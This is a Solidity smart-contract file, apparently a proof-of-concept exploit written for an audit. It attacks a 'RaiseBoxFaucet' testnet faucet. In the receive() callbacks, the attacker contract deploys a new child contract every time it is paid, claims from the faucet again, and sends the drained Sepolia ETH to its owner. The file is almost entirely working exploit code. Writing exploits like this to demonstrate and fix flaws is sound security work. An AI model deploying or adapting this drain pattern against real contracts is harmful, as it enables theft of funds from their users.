// SPDX-Lincense-Identifier: MIT
pragma solidity ^0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {console2} from "../lib/lib/forge-std/src/Test.sol";

interface IRaiseBoxFaucet is IERC20 {
    function claimFaucetTokens() external;
    function getContractSepEthBalance() external view returns (uint256);
    function sepEthAmountToDrip() external view returns(uint256);
}

contract FaucetAttacker is Ownable {
    IRaiseBoxFaucet raiseBoxFaucet;
    SingleAttackContract singleAttackContract;
    
    constructor(address _raiseBoxFauecet)Ownable(msg.sender) payable{
        raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFauecet);
    }

    function attack() external onlyOwner{
        console2.log("--------START Attack--------");
        raiseBoxFaucet.claimFaucetTokens();    
        console2.log("-------END attack-----");    
    }

    receive() external payable{
        
        if(raiseBoxFaucet.getContractSepEthBalance() > raiseBoxFaucet.sepEthAmountToDrip() && msg.sender == address(raiseBoxFaucet)){
            singleAttackContract = new SingleAttackContract(address(raiseBoxFaucet));
            console2.log("-------new attack sent-----");
            singleAttackContract.callFaucet();
        } else {

            (bool success, ) = owner().call{value: address(this).balance}("");
            require(success, "final transfer failed");
            console2.log("-------Eth transferred to the owner----");
        }
        
    }
}

contract SingleAttackContract {
    address mainContract;
    IRaiseBoxFaucet raiseBoxFaucet;
    constructor(address _raiseBoxFaucet){
        mainContract = msg.sender;
        raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFaucet);
    }

    function callFaucet() external {
        raiseBoxFaucet.claimFaucetTokens();
    }

    receive() external payable {
        (bool success,) = mainContract.call{value: msg.value}("");
        require(success, "transfer to main contract failed");
    }
}